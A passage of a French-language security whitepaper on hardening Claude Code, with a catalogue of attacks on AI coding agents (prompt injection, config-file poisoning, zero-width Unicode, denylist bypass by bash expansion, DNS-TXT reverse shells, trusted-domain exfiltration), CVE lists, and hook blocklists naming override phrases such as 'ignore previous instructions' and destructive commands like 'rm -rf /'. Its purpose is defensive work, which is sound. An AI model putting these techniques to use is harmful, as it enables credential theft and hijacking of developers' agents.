+- **T025 Comment and Control: CI/CD Credential Theft** : titres de PR et commentaires d'issues injectés dans les agents CI/CD via GitHub Actions, fuite d'ANTHROPIC_API_KEY et GITHUB_TOKEN. (Johns Hopkins / SecurityWeek, CVSS 9.4)
+- **T026 Claudy Day: Session Hijack via URL Injection** : 3 vulnérabilités chaînées sur Claude.ai (URL injection + open redirect + Google Ads bypass) permettent un hijack silencieux en un clic.
+- **T027 Supply Chain Memory Poisoning** : dépendance compromise écrit dans CLAUDE.md / MEMORY.md des instructions de backdoor qui persistent entre tous les projets et sessions. (Cisco / THN)
+- **T028 Zero-Click RCE via Prompt Injection** : injection de prompt sans interaction utilisateur permet une exécution de code arbitraire. Démontré par Cymulate (mai 2026) sur Cursor, AWS Kiro et OpenAI Codex. Vecteur : fichiers du projet ou dépendances lus automatiquement par l'agent.
+- **T029 AGENTS.md Supply Chain File Injection** : fichier `AGENTS.md` (convention multi-agent OpenAI) utilisé comme vecteur d'injection de chaîne d'approvisionnement. Recherche NVIDIA : un dépôt malveillant peut injecter des instructions persistantes via `AGENTS.md` lus par d'autres agents dans la même session.
+
+**Menaces Récentes (v2.17.0 → v2.23.0, juillet 2026)** :
+
+- **T030 TrustFall : auto-approbation d'un repo malveillant via le dialog de confiance** : un `.mcp.json` ou `.claude/settings.json` piégé dans un repo cloné active tous les serveurs MCP du projet dès l'acceptation du trust prompt, une simple touche Entrée. Confirmé vulnérable sur Claude Code, Gemini CLI, Cursor CLI et GitHub Copilot CLI. Anthropic considère le trust dialog comme un consentement explicite suffisant et n'a pas corrigé, la défense repose donc entièrement sur la revue manuelle avant d'accepter. (Adversa AI, 2026-05-08)
+- **T031 Shadow Escape : exfiltration zero-click via document piégé** : un PDF ou tableur malveillant uploadé à un assistant IA connecté en MCP suffit à déclencher un accès silencieux aux systèmes connectés (CRM, base de données) et une exfiltration de données sans autre interaction utilisateur que l'upload. (Operant AI, mai 2026)
+- **T032 Miasma Worm : injection Unicode zero-width dans les fichiers de config agent** : des caractères Unicode invisibles (`U+200B`, `U+200C`, `U+200D`, `U+FEFF`) injectés dans `CLAUDE.md`, `.cursorrules` ou `AGENTS.md` via des packages npm compromis restent invisibles dans les diffs GitHub tout en étant exécutés par l'agent. Premier ver documenté capable de se propager entre organisations via des dépendances npm partagées. (TeamPCP / StepSecurity, juin 2026)
+- **T033 Agentjacking : injection via faux événements Sentry** : un DSN Sentry write-only exposé publiquement permet de fabriquer des événements d'erreur piégés ; quand un développeur demande à son agent de "corriger les erreurs Sentry", l'agent exécute le payload comme une instruction de diagnostic légitime. 85% de taux de succès en test, plus de 2 388 organisations exposées identifiées. (Tenet Security, 2026-06-17)
+
+**Menaces Récentes (v2.23.0 → v2.27.0, août 2026)** :
+
+- **T034 GhostApproval** : un fichier en apparence anodin dans un repo est en réalité un lien symbolique vers un emplacement sensible de la machine (`~/.ssh/authorized_keys`) ; l'agent suit le lien et écrit le contenu de l'attaquant pendant que la boîte de confirmation n'affiche que le chemin bénin du projet.
+- **T035 GuardFall** : faille structurelle des denylists qui filtrent la commande shell en texte brut avant l'expansion bash, alors que bash évalue le texte après expansion ; toute réécriture équivalente à un pattern bloqué mais qui passe le filtre textuel contourne la garde.
+- **T036 Runtime DNS-TXT Payload Delivery** : un script de setup récupère un payload encodé en base64 depuis un enregistrement DNS TXT contrôlé par l'attaquant, l'exécute, et ouvre un reverse shell ; le payload n'existe nulle part dans le repo au moment de la revue statique.
+- **T037 Friendly Fire** : des injections cachées dans la documentation d'une librairie tierce détournent l'agent pendant une revue de sécurité automatisée, transformant une tâche défensive en exécution de code arbitraire.
+- **T038 HalluSquatting** : des attaquants pré-enregistrent des noms de packages malveillants correspondant à des hallucinations récurrentes des LLM, puis attendent qu'un agent recommande ce nom à un autre développeur.
+- **T039 Agent Config Persistence** : un `.claude/settings.json` ou `.vscode/tasks.json` avec un hook `SessionStart`/`folderOpen` exécute du code dès l'ouverture du repo, avant toute action de l'utilisateur.
+- **T040 AI Agent Commit Impersonation** : un token GitHub volé sert à committer sous l'identité d'un agent IA, noyant les écritures malveillantes dans l'historique des équipes qui laissent déjà des agents committer.
+- **T041 Ghostjacking** : injection indirecte via des logs ou alertes que l'agent inspecte plus tard, les instructions malveillantes arrivant par une donnée d'observabilité traitée à tort comme fiable.
+- **T042 Progressive Disclosure Payload Hiding** : le fichier d'entrée d'un skill est propre, les instructions malveillantes vivent dans un fichier secondaire chargé seulement à une étape précise, invisible à la revue du `SKILL.md`.
+- **T043 Trusted-Domain Counter as Exfiltration Oracle** : quand l'allowlist d'un agent fait confiance à un nom de domaine, un compteur public sur ce domaine devient un canal d'exfiltration caractère par caractère, sans jamais contacter l'infrastructure de l'attaquant.
+
+**CVEs Récents (v2.11.0 → v2.16.0)** :
+
+- **CVE-2026-0755** (Critical) : gemini-mcp-tool command injection via `claude_output` parameter
+- **CVE-2026-25725** : Claude Code sandbox escape (bubblewrap)
+- **CVE-2026-25253** : OpenClaw auth token theft + RCE (17500+ instances exposées)
+- **CVE-2025-35028** : HexStrike AI MCP Server
+- **CVE-2025-15061** : Framelink Figma MCP Server fetchWithRetry RCE
+- **CVE-2026-3484** : nmap-mcp-server command injection
+- **CVE-2026-33032** : nginx-ui MCPwn, authentication bypass, KEV actively exploited
+- **ADVISORY-MCP-STDIO-2026-001** : faille de design MCP STDIO (OX Security), 7000+ serveurs exposés, 150M+ téléchargements
+- **CVE-2025-69256** : Serverless Framework MCP RCE
+- **CVE-2026-6494** : AAP MCP Server log injection (Red Hat)
+
+**CVEs v2.17.0 (mai 2026)** :
+
+- **CVE-2025-66335** : Apache Doris MCP Server, injection SQL via paramètre non sanitisé dans l'interface MCP.
+- **CVE-2025-53107** : Git MCP Server, injection de commande via nom de branche malformé, RCE sur le serveur hôte.
+- **CVE-2026-22252** : LibreChat STDIO transport, RCE via désérialisation non sécurisée dans le handler de messages STDIO.
+- **CVE-2026-22688** : WeKnora STDIO transport, RCE via traversal de chemin dans les requêtes MCP STDIO.
+- **CVE-2025-54994** : `@akoskm/create-mcp-server-stdio`, RCE via injection de commande dans le script de génération de serveur MCP.
+- **CVE-2026-26030** : Microsoft AI agent framework, RCE via chaînage d'outils (tool-chaining) permettant une escalade de privilèges entre agents.
+
+**CVEs v2.18.0 → v2.23.0 (juin-juillet 2026)** :
+
+- **CVE-2026-50548 / CVE-2026-50549** (Critical, CVSS 9.8 chacun) : sandbox terminal agent de Cursor, bypass de la restriction de répertoire de travail permettant d'exécuter des commandes hors du workspace prévu, chaîné avec une échappatoire d'écriture de fichiers via un fallback de canonicalisation de chemin non sécurisé. Corrigé en Cursor Desktop 3.0+.
+- **CVE-2026-32871** (High) : FastMCP OpenAPIProvider, SSRF et path traversal via des templates d'URL non encodés dans la génération de tools.
+- **CVE-2026-32625** (Critical, CVSS 9.6) : LibreChat, vulnérabilités de contrôle d'accès MCP et d'injection de variables d'environnement.
+- **CVE-2026-0621** (Medium) : SDK TypeScript MCP officiel (`@modelcontextprotocol/sdk`), ReDoS via les tableaux de resource templates.
+
+**Usage avec /security-check** :
+
+```bash
+# Quick scan config vs known threats (~30s)
+/security-check
+
+# Full 6-phase audit with score /100 (2-5min)
+/security-audit
+```
+
+**Mise à jour** :
+
+```bash
+# Research + update threat-db.yaml
+/update-threat-db
+```
+
+### WASM MCP Tool Sandboxing (émergent, expérimental)
+
+Une approche complémentaire au vetting manuel commence à émerger : compiler les tools MCP en composants WebAssembly avec permissions déclaratives, refusées par défaut au niveau du runtime. **Wassette** (Microsoft) déclare le filesystem, les hôtes réseau et les variables d'environnement accessibles à chaque composant dans un fichier de policy YAML, s'appuyant sur Wasmtime pour une isolation que Microsoft qualifie de "browser-grade". **wasmcp** suit une approche similaire avec isolation par frontière WIT.
+
+Cette piste vaut d'être surveillée mais n'est pas mûre : Wassette est en v0.4.0 et se déclare lui-même "not production-ready". Pour un threat model incluant des serveurs MCP tiers ou compromis avec un accès filesystem imprévisible, c'est la bonne direction architecturale à long terme, mais aujourd'hui le chemin pratique reste l'audit MCP en 5 minutes ci-dessus combiné à l'isolation par conteneur.
+
+## Kill switch : Containment d'Agents autonomes (v3.27.4)
+
+**Nouveau** : Architecture de containment pour agents autonomes qui "s'emballent" (runaway agents).
+
+**Cadre** : les exigences légales dépendent du système, de son usage et du calendrier applicable. L’AI Act ne rend pas universellement obligatoire un kill switch pour tout agent de code. Faites examiner les obligations propres au traitement.
+
+| Niveau | Contrôle à définir |
+|--------|--------------------|
+| Révocation ciblée | Retirer les accès ou identifiants de l’agent concerné |
+| Limites d’exécution | Budget, nombre de tentatives, échéance et arrêt supervisé |
+| Arrêt global | Processus identifié, procédure testée, état et journaux sauvegardés |
+
+Le script `velocity-governor.sh` du guide estime la consommation et peut ralentir les appels. Il ne garantit ni un quota exact de 20 appels par minute ni un arrêt de tous les processus. Validez les métriques et les limites avec votre runtime.
+
+### Heartbeat et Supervision
+
+Un watchdog fiable exige un identifiant de session stable, une écriture atomique des battements, un délai adapté au travail, et l’identification vérifiée du processus ou groupe à arrêter. Le PID d’un hook n’est pas nécessairement celui de Claude ni son groupe de processus. Testez l’absence de battement, la reprise et l’arrêt dans un environnement isolé avant activation.
+
+Les contrôles de configuration et les prompts d’arrêt ne remplacent pas une supervision externe lorsqu’un plafond doit être imposé. Voir le [guide de durcissement](https://github.com/FlorianBruniaux/claude-code-ultimate-guide/blob/main/guide/security/security-hardening.md).
+
+## Layer 4 : Revue humaine
+
+Le dernier rempart : **vous**.
+
+| Action | Vérification |
+|--------|--------------|
+| Diff review | Toujours lire avant d'accepter |
+| Bash commands | Comprendre avant d'exécuter |
+| MCP additions | Audit avant d'approuver |
+| Fichiers sensibles | Double-check accès |
+
+{{< pagebreak >}}
+
+# Exemples de Hooks de Sécurité
+
+## Vue d'Ensemble
+
+Le tableau présente une sélection de scripts pour plusieurs événements, dont SessionStart, PreToolUse, PostToolUse, Notification et SessionEnd. Ils sont concus pour etre composes -- chaque hook fait une seule chose, et c'est leur combinaison dans `settings.json` qui construit la defense en profondeur.
+
+| Hook | Event | Description |
+|------|-------|-------------|
+| [`dangerous-actions-blocker.sh`](https://github.com/FlorianBruniaux/claude-code-ultimate-guide/blob/main/examples/hooks/bash/dangerous-actions-blocker.sh) | PreToolUse | Bloque commandes destructrices |
+| [`security-check.sh`](https://github.com/FlorianBruniaux/claude-code-ultimate-guide/blob/main/examples/hooks/bash/security-check.sh) | PreToolUse | Bloque secrets dans commandes |
+| [`prompt-injection-detector.sh`](https://github.com/FlorianBruniaux/claude-code-ultimate-guide/blob/main/examples/hooks/bash/prompt-injection-detector.sh) | PreToolUse | Détecte tentatives d'injection |
+| [`unicode-injection-scanner.sh`](https://github.com/FlorianBruniaux/claude-code-ultimate-guide/blob/main/examples/hooks/bash/unicode-injection-scanner.sh) | PreToolUse | Détecte zero-width, RTL, ANSI |
+| [`repo-integrity-scanner.sh`](https://github.com/FlorianBruniaux/claude-code-ultimate-guide/blob/main/examples/hooks/bash/repo-integrity-scanner.sh) | PreToolUse | Scanne README/package.json |
+| [`mcp-config-integrity.sh`](https://github.com/FlorianBruniaux/claude-code-ultimate-guide/blob/main/examples/hooks/bash/mcp-config-integrity.sh) | SessionStart | Vérifie hash config MCP |
+| [`claudemd-scanner.sh`](https://github.com/FlorianBruniaux/claude-code-ultimate-guide/blob/main/examples/hooks/bash/claudemd-scanner.sh) | SessionStart | Détecte injection CLAUDE.md |
+| [`output-secrets-scanner.sh`](https://github.com/FlorianBruniaux/claude-code-ultimate-guide/blob/main/examples/hooks/bash/output-secrets-scanner.sh) | PostToolUse | Détecte secrets dans outputs |
+| [`auto-format.sh`](https://github.com/FlorianBruniaux/claude-code-ultimate-guide/blob/main/examples/hooks/bash/auto-format.sh) | PostToolUse | Auto-format après édits |
+| [`notification.sh`](https://github.com/FlorianBruniaux/claude-code-ultimate-guide/blob/main/examples/hooks/bash/notification.sh) | Notification | Alertes sonores macOS |
+| [`security-check.ps1`](https://github.com/FlorianBruniaux/claude-code-ultimate-guide/blob/main/examples/hooks/powershell/security-check.ps1) | PreToolUse | Bloque secrets (PowerShell) |
+| [`auto-format.ps1`](https://github.com/FlorianBruniaux/claude-code-ultimate-guide/blob/main/examples/hooks/powershell/auto-format.ps1) | PostToolUse | Auto-format (PowerShell) |
+| [`output-validator.sh`](https://github.com/FlorianBruniaux/claude-code-ultimate-guide/blob/main/examples/hooks/bash/output-validator.sh) | PostToolUse | Valide outputs (heuristique) |
+| [`session-logger.sh`](https://github.com/FlorianBruniaux/claude-code-ultimate-guide/blob/main/examples/hooks/bash/session-logger.sh) | PostToolUse | Log activités JSONL |
+| [`velocity-governor.sh`](https://github.com/FlorianBruniaux/claude-code-ultimate-guide/blob/main/examples/hooks/bash/velocity-governor.sh) | PreToolUse | Ralentissement fondé sur une estimation ; limites à tester |
+| [`rtk-baseline.sh`](https://github.com/FlorianBruniaux/claude-code-ultimate-guide/blob/main/examples/hooks/bash/rtk-baseline.sh) | SessionStart | Baseline RTK pour delta tracking |
+| [`session-summary.sh`](https://github.com/FlorianBruniaux/claude-code-ultimate-guide/blob/main/examples/hooks/bash/session-summary.sh) | SessionEnd | Auto-résumé de session |
+
+## Top 5 Essentiels pour Démarrer
+
+### 1. dangerous-actions-blocker.sh
+
+**Priorité** : Critique
+
+Bloque :
+
+- `rm -rf /`, `sudo rm`, `dd if=`
+- `DROP DATABASE`, `DROP TABLE`
+- `git push --force main/master`
+- `npm publish`, `pnpm publish`
+- Patterns secrets (`password=`, `api_key=`)
+
+### 2. prompt-injection-detector.sh
+
+**Priorité** : Élevée
+
+Détecte :
+
+- Role override ("ignore previous instructions")
+- Jailbreak ("DAN mode", "developer mode")
+- Delimiter injection (`</system>`, `[INST]`)
+- Authority impersonation
+- Base64 encoded payloads
+
+### 3. unicode-injection-scanner.sh
+
+**Priorité** : Élevée
+
+Détecte :
+
+- Zero-width characters (`U+200B-U+200D`)
+- RTL override (`U+202E`)
+- ANSI escape sequences (`\x1b[`)
+- Null bytes (`\x00`)
+- Tag characters (`U+E0000-U+E007F`)
+
+### 4. repo-integrity-scanner.sh
+
+**Priorité** : Moyenne
+
+Scanne avant ouverture de repo inconnu :
+
+- Commentaires HTML cachés dans README
+- Scripts npm malveillants
+- Configurations Claude/Cursor tampérées
+- Base64 dans commentaires code
+
+### 5. output-secrets-scanner.sh
+
+**Priorité** : Élevée
+
+Détecte dans les outputs :
+
+- API Keys (OpenAI, Anthropic, AWS, GCP, Stripe...)
+- Tokens (GitHub, GitLab, NPM, PyPI, JWT)
+- Private keys (RSA, EC, DSA, OpenSSH, PGP)
+- Database URLs avec passwords
+
+{{< pagebreak >}}
+
+## Installation des Scripts
+
+Deux commandes suffisent pour déployer l'ensemble des hooks sur votre machine. L'installation copie les scripts dans le repertoire global `~/.claude/hooks/`, ce qui les rend disponibles pour tous les projets. Les hooks ne sont actifs qu'une fois references dans le `settings.json` du projet ou du profil global.
+
+```bash
+# Depuis la racine du dépôt cloné, après revue des scripts
+mkdir -p ~/.claude/hooks
+cp examples/hooks/bash/*.sh ~/.claude/hooks/
+chmod +x ~/.claude/hooks/*.sh
+```
+
+## Configuration Complète
+
+Cette configuration regroupe les hooks essentiels sur les trois events critiques. Les hooks PreToolUse bloquent avant execution, les hooks PostToolUse inspectent les resultats, et les hooks SessionStart verifient l'integrite de l'environnement au demarrage.
+
+```json
+{
+  "hooks": {
+    "PreToolUse": [
+      {
+        "matcher": "Bash",
+        "hooks": [
+          {
+            "type": "command",
+            "command": "~/.claude/hooks/dangerous-actions-blocker.sh"
+          }
+        ]
+      },
+      {
+        "matcher": "Edit|Write",
+        "hooks": [
+          {
+            "type": "command",
+            "command": "~/.claude/hooks/prompt-injection-detector.sh"
+          },
+          {
+            "type": "command",
+            "command": "~/.claude/hooks/unicode-injection-scanner.sh"
+          }
+        ]
+      }
+    ],
+    "PostToolUse": [
+      {
+        "matcher": "Bash",
+        "hooks": [
+          {
+            "type": "command",
+            "command": "~/.claude/hooks/output-secrets-scanner.sh"
+          }
+        ]
+      }
+    ],
+    "SessionStart": [
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "~/.claude/hooks/mcp-config-integrity.sh"
+          },
+          {
+            "type": "command",
+            "command": "~/.claude/hooks/claudemd-scanner.sh"
+          }
+        ]
+      }
+    ]
+  }
+}
+```
+
+> 📖 **Pour aller plus loin :** [§7.4 Security Hooks](https://github.com/FlorianBruniaux/claude-code-ultimate-guide/blob/main/guide/ultimate-guide.md#74-security-hooks) (event system complet, templates prêts à l'emploi) | [38 templates hooks](https://github.com/FlorianBruniaux/claude-code-ultimate-guide/tree/main/examples/hooks/)
+
+::: {.callout-note title="Limites du Scanner de Secrets en Sortie"}
+`output-secrets-scanner.sh` inspecte les résultats et produit un avertissement. Il ne bloque pas rétrospectivement une lecture, ne rédige pas automatiquement la sortie et ne remplace pas un contrôle pre-commit. Testez les motifs reconnus avec des jetons fictifs et vérifiez les canaux non couverts.
+:::
+
+{{< pagebreak >}}
+
+# Réponse aux Incidents
+
+## Secret exposé
+
+### Premières 15 Minutes
+
+Les 15 premières minutes sont critiques : chaque minute où un secret reste valide après exposition est une fenêtre d'exploitation potentielle. Priorité absolue à la révocation avant toute investigation.
+
+**Stop the bleeding** :
+
+```bash
+# 1. Révoquer immédiatement
+# AWS
+aws iam delete-access-key --access-key-id AKIA... --user-name <user>
+
+# GitHub: Settings → Developer settings → Personal access tokens → Revoke
+
+# 2. Confirmer la portée
+git log --oneline origin/main..HEAD
+git log -p | grep -E "(AKIA|sk_live_|ghp_|xoxb-)"
+
+# 3. Scan complet
+gitleaks detect --source . --report-format json > exposure-report.json
+```
+
+### Première Heure
+
+Si le secret a ete pousse vers le remote, la revocation seule ne suffit pas -- l'historique git conserve le contenu indefiniment. La reecriture d'historique est necessaire mais destructive : elle invalide tous les clones existants et necessite une coordination avec l'equipe.
+
+```bash
+# Si poussé, réécrire l'historique
+git filter-repo --invert-paths --path <file-with-secret>
+# ATTENTION: Coordonner avec l'équipe
+```
+
+### Premières 24 Heures
+
+1. Rotation de TOUS les credentials liés
+2. Notification équipe/compliance (GDPR, SOC2, HIPAA)
+3. Documentation timeline incident
+
+## MCP compromis
+
+Si un serveur MCP est compromis, chaque minute de délai augmente la surface d'exposition. Le séquencement ci-dessous est optimisé pour limiter les dégâts : désactivation d'abord, investigation ensuite.
+
+```bash
+# Identifier le nom et la portée, puis retirer le serveur concerné
+claude mcp list
+claude mcp remove NOM_DU_SERVEUR --scope project
+```
+
+Arrêtez aussi le processus ou service suspect si nécessaire. Préservez les preuves et comparez la configuration au dernier état approuvé avant restauration. Les configurations peuvent être dans `.mcp.json` ou `~/.claude.json` selon la portée ; les transcriptions natives sont sous `~/.claude/projects/`. Révoquez les identifiants potentiellement exposés sans attendre qu’un scanner confirme une fuite.
+
+## Protocole post-incident Claude Code
+
+::: {.callout-important title="Protocole post-incident en 5 etapes"}
+Si vous suspectez une fuite de données via Claude Code :
+
+**1. Isolation immediate** : Terminer toutes les sessions Claude Code actives (`Ctrl+C` ou fermer les terminaux). Désactiver temporairement les MCPs concernés dans `~/.claude/mcp.json`.
+
+**2. Rotation des secrets** : Révoquer et régénérer tous les tokens/clés potentiellement exposés. Prioriser les credentials avec accès write (GitHub, AWS, bases de données production).
+
+**3. Audit des logs** : Consulter `~/.claude/projects/<projet>/` ; les fichiers JSONL contiennent l'historique complet des tool calls de la session. Identifier précisément quels fichiers ont été lus ou quelles commandes ont été exécutées.
+
+**4. Review CLAUDE.md et settings.json** : Vérifier que `permissions.deny` couvre bien les fichiers sensibles. Contrôler les hooks actifs dans `.claude/settings.json` pour détecter d'éventuelles modifications.
+
+**5. Bilan et hardening** : Documenter l'incident (timeline, vecteur, impact). Mettre à jour les règles `permissions.deny` pour combler le gap exploité. Planifier une revue de sécurité avec l'équipe.
+:::
+
+{{< pagebreak >}}
+
+# Le Paradoxe de la Vérification
+
+## Le Problème
+
+Une succession de résultats acceptables peut réduire l’attention portée aux erreurs suivantes.
+
+**Le paradoxe** : Plus la fiabilité de l'IA augmente, plus la qualité de la review humaine diminue.
+
+- **Vigilance fatigue** : Erreurs rares passent inaperçues quand humains font inconsciemment confiance aux patterns qui marchent habituellement
+- **Comportement pattern-trusting** : Review manuelle se dégrade car reviewers arrêtent d'attendre des erreurs
+- **Fausse confiance** : "Ça a marché les 50 dernières fois" crée angles morts pour le 51ème échec
+
+**Source** : Alan Engineering (Charles Gorintin, CTO), Newsletter Intelligence Humaine (Feb 2026)
+
+## La solution
+
+**Paradoxe** : Vous ne pouvez pas compter sur humains pour attraper erreurs rares dans output IA quasi-parfait.
+
+**Solution** : Automated guardrails > Manual review
+
+**Option A: Pre-commit hooks** (recommandé)
+
+```bash
+# Note : ceci est un git pre-commit hook (.git/hooks/pre-commit), distinct des hooks Claude Code configurés dans .claude/settings.json
+# .git/hooks/pre-commit
+#!/bin/bash
+
+echo "🔍 Automated verification (Verification Paradox defense)..."
+
+# 1. Type safety
+npm run typecheck || { echo "❌ Type errors"; exit 1; }
+
+# 2. Lint
+npm run lint || { echo "❌ Lint errors"; exit 1; }
+
+# 3. Tests
+npm run test || { echo "❌ Tests failing"; exit 1; }
+
+# 4. Security scan
+npm audit --audit-level=moderate || { echo "⚠️ Security issues"; exit 1; }
+
+echo "✅ All checks passed"
+```
+
+**Option B: CI/CD gating** (pour équipes)
+
+- Bloquer merge si CI fail (tests, lint, security scans)
+- Automated performance benchmarks
+- Security scanners automatisés
+
+**Principe** : Automatiser la detection d'erreurs que humains ne catcheront plus de maniere fiable.
+
+::: {.callout-warning title="Illustration hypothétique : Nadia, tech lead dans un editeur SaaS B2B (40 devs)"}
+**Contexte** : Nadia utilise Claude Code pour generer des migrations SQL depuis 3 mois. Chaque migration passe une code review humaine avant merge.
+
+**Ce qui s'est passe** : Apres 47 migrations correctes, la 48eme contenait un `ALTER TABLE` qui supprimait une colonne encore utilisee par un microservice en aval. Le reviewer a approuve en 30 secondes -- "Claude n'a jamais fait d'erreur sur les migrations".
+
+**Impact** : Incident production de 2 heures, rollback necessaire, 3 microservices impactes. Le reviewer a reconnu n'avoir "meme pas lu le SQL" avant d'approuver.
+
+**Prevention** : Un pre-commit hook qui valide les migrations contre le schema actuel (`npm run typecheck` + test d'integration) aurait bloque le merge automatiquement, sans dependre de la vigilance humaine.
+:::
+
+::: {.callout-tip title="Memo -- Paradoxe de la Verification en 30 secondes"}
+**Principe** : Plus l'IA est fiable, moins la revue humaine est vigilante -- les erreurs rares passent inapercues.
+
+**Solution** : Remplacer la revue humaine par des guardrails automatises (pre-commit hooks, CI/CD gates, security scanners).
+
+**Anti-pattern** : Compter sur un humain pour relire 100% des outputs des sorties d’une IA sans contrôles indépendants.
+
+**Resultat attendu** : Les erreurs sont detectees mecaniquement, independamment de la fatigue du reviewer.
+:::
+
+{{< pagebreak >}}
+
+# Quel Niveau de Sécurité pour Votre Contexte ?
+
+## Arbre de Décision
+
+```
+Quel niveau de securite pour mon contexte ?
+
+Mon projet Claude Code
+└─ Donnees sensibles ?
+   ├─ Non - projet perso → Niveau Minimal
+   │  └─ permissions.deny basique | Pas de .env en contexte
+   └─ Oui - secrets/PII → Taille equipe ?
+      ├─ Solo/freelance → Niveau Standard
+      │  └─ permissions.deny complet | Network isolation | CLAUDE.md securise
+      └─ Equipe/startup → Secteur reglemente ?
+         ├─ Non → Niveau Renforce
+         │  └─ Tout Standard + hooks de validation | Revue logs reguliere
+         └─ Oui - finance/sante → Niveau Enterprise + audit
+            └─ Tout Renforce + RBAC | Audit trail complet | Compliance review
+```
+
+## Comparaison des Niveaux de Sécurité
+
+| Configuration | Minimal (perso) | Standard (startup) | Renforce (equipe) | Enterprise |
+|---------------|-----------------|-------------------|-------------------|------------|
+| `permissions.deny` `.env*` | Oui | Oui | Oui | Oui |
+| `permissions.deny` SSH/PEM | Non | Oui | Oui | Oui |
+| `dangerous-actions-blocker.sh` | Non | Oui | Oui | Oui |
+| `output-secrets-scanner.sh` | Non | Oui | Oui | Oui |
+| `prompt-injection-detector.sh` | Non | Non | Oui | Oui |
+| MCP versions pinées | Non | Oui | Oui | Oui |
+| `velocity-governor.sh` | Non | Non | Oui | Oui |
+| `session-logger.sh` (audit) | Non | Non | Non | Oui |
+| Examiner les conditions de rétention/ZDR | Selon données | Selon données | Selon données | Selon contrat |
+| Gitleaks pre-commit | Non | Non | Oui | Oui |
+| Revue securite trimestrielle | Non | Non | Non | Oui |
+| **Effort d'installation** | 10 min | 30 min | 1h | Demi-journee |
+
+# Checklist Sécurité Production
+
+## Niveau basic (solo dev)
+
+| # | Action | Fait |
+|---|--------|------|
+| 1 | `output-secrets-scanner.sh` installé | ☐ |
+| 2 | `dangerous-actions-blocker.sh` installé | ☐ |
+| 3 | `.env*` dans permissions.deny | ☐ |
+| 4 | Secrets hors du projet (vault externe) | ☐ |
+
+## Niveau Standard (Équipe)
+
+| # | Action | Fait |
+|---|--------|------|
+| 5 | `prompt-injection-detector.sh` actif | ☐ |
+| 6 | `unicode-injection-scanner.sh` actif | ☐ |
+| 7 | MCP vettés (Safe List) | ☐ |
+| 8 | Versions MCP pinées (`@x.y.z`) | ☐ |
+| 9 | Database credentials read-only | ☐ |
+| 10 | `repo-integrity-scanner.sh` pour repos inconnus | ☐ |
+
+## Niveau hardened (enterprise)
+
+| # | Action | Fait |
+|---|--------|------|
+| 11 | `mcp-config-integrity.sh` + hash verification | ☐ |
+| 12 | `claudemd-scanner.sh` au SessionStart | ☐ |
+| 13 | Zero Data Retention (ZDR) activé | ☐ |
+| 14 | Git hooks pre-commit avec Gitleaks | ☐ |
+| 15 | Session logging activé (audit trail) | ☐ |
+| 16 | Filesystem MCP désactivé ou patché | ☐ |
+| 17 | Backup config MCP régulier | ☐ |
+| 18 | Incident response plan documenté | ☐ |
+| 19 | Formation équipe sécurité Claude | ☐ |
+| 20 | Revue sécurité trimestrielle | ☐ |
+| 21 | `sandbox.credentials` activé (bloque lecture credentials en sandbox) | ☐ |
+
+La checklist ci-dessus est votre point de depart. Pour aller plus loin, les ressources suivantes referent les CVE documentes, les outils de detection de secrets, et les whitepapers complementaires de cette serie.
+
+{{< pagebreak >}}
+
+# Ressources
+
+## Références CVE & Recherche Sécurité
+
+Les CVE et advisories ci-dessous sont les sources primaires referenciees dans ce whitepaper. Chaque lien pointe vers le rapport original du chercheur ou l'advisory officiel, permettant de verifier les details techniques et les versions affectees.
+
+| CVE / Source | Lien |
+|--------------|------|
+| CVE-2025-53109, CVE-2025-53110 | [Cymulate EscapeRoute](https://cymulate.com/blog/cve-2025-53109-53110-escaperoute-anthropic/) |
+| CVE-2025-54135 | [Cato CurXecute](https://www.catonetworks.com/blog/curxecute-rce/) |
+| CVE-2025-54136 | [Checkpoint MCPoison](https://research.checkpoint.com/2025/cursor-vulnerability-mcpoison/) |
+| CVE-2026-24052 | [SentinelOne WebFetch SSRF](https://www.sentinelone.com/vulnerability-database/cve-2026-24052/) |
+| CVE-2025-66032 | [Flatt Security - 8 ways to pwn Claude Code](https://flatt.tech/research/posts/pwning-claude-code-in-8-different-ways/) |
+| ADVISORY-CC-2026-001 | Claude Code CHANGELOG v2.1.34 |
+| **Snyk ToxicSkills** | [ToxicSkills Report](https://snyk.io/fr/blog/toxicskills-malicious-ai-agent-skills-clawhub/) |
+| **Koi ClawHavoc** | [ClawHavoc Campaign](https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting) |
+| **SafeDep Threat Model** | [Agent Skills Threat Model](https://safedep.io/agent-skills-threat-model) |
+| CVE-2026-23744 | MCPJam RCE, exploitation du handshake protocole MCP |
+| **CVE-2026-33010** | mcp-memory-service CORS misconfiguration → cross-origin memory theft (fix: v10.25.1) |
+| **CVE-2026-27825/27826** | mcp-atlassian unrestricted file write + RCE chaîné (MCPwnfluence) |
+| **OWASP Agentic AI Top 10 2026** | [OWASP Agentic AI Top 10](https://owasp.org/www-project-agentic-ai-top-10/) |
+| **Mcpwn** | [MCP Security Scanner](https://github.com/AgniveshChaubey/mcpwn) |
+| **Cisco DefenseClaw** | Open-source, scanners Skills + MCP + a2a |
+| **Ferrok** | Mappé sur OWASP MCP Top 10 2026 |
+
+## Outils secrets
+
+Gitleaks, TruffleHog et GitGuardian couvrent des usages de détection de secrets différents. Comparez-les sur un corpus témoin représentatif et examinez les faux positifs comme les secrets manqués ; aucun classement chiffré universel n’est établi ici.
+
+## Standards et Référentiels Sécurité
+
+| Ressource | Contenu | Lien |
+|-----------|---------|------|
+| **OWASP Agentic AI Top 10** | Référentiel officiel des risques des agents IA (2026) | [owasp.org/www-project-agentic-ai-top-10](https://owasp.org/www-project-agentic-ai-top-10/) |
+| **OWASP Top 10 LLM** | Risques spécifiques aux applications LLM | [owasp.org/www-project-top-10-for-large-language-model-applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/) |
+| **OWASP Prompt Injection** | Guide officiel contre l'injection de prompts | [owasp.org/www-community/attacks/Prompt_Injection](https://owasp.org/www-community/attacks/Prompt_Injection) |
+| **CVE Database** | Base de données officielle des vulnérabilités | [cve.mitre.org](https://cve.mitre.org) |
+| **NVD (NIST)** | National Vulnerability Database avec scores CVSS | [nvd.nist.gov](https://nvd.nist.gov) |
+| **Gitleaks** | Détection de secrets dans git (open source) | [github.com/gitleaks/gitleaks](https://github.com/gitleaks/gitleaks) |
+| **TruffleHog** | Scanner de secrets multi-source | [github.com/trufflesecurity/trufflehog](https://github.com/trufflesecurity/trufflehog) |
+| **mcp-scan (Snyk)** | Scanner supply chain pour skills et MCPs | [github.com/snyk/mcp-scan](https://github.com/snyk/mcp-scan) |
